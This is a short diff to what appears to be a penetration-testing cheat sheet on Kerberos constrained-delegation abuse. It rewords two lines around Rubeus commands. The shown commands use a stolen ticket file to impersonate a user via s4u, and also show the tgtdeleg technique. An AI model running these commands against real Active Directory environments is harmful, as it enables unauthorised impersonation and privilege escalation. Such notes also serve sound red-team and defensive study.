@@ -736,11 +736,11 @@ tgs::s4u /tgt:CERT_WE_STOLE.kirbi
 
 #### Rubeus SFU - constrained delegation user 
 
-Rubeus (can put ```/ptt``` to inject ticket directly, or save for later):
+Rubeus (optional ```/ptt``` ```/domain``` ```/dc```):
 ```Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:user_we_are_impersonating /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo}```
 
 
-Another example:
+Example:
 
 ```Rubeus.exe tgtdeleg```
 https://github.com/GhostPack/Rubeus#tgtdeleg
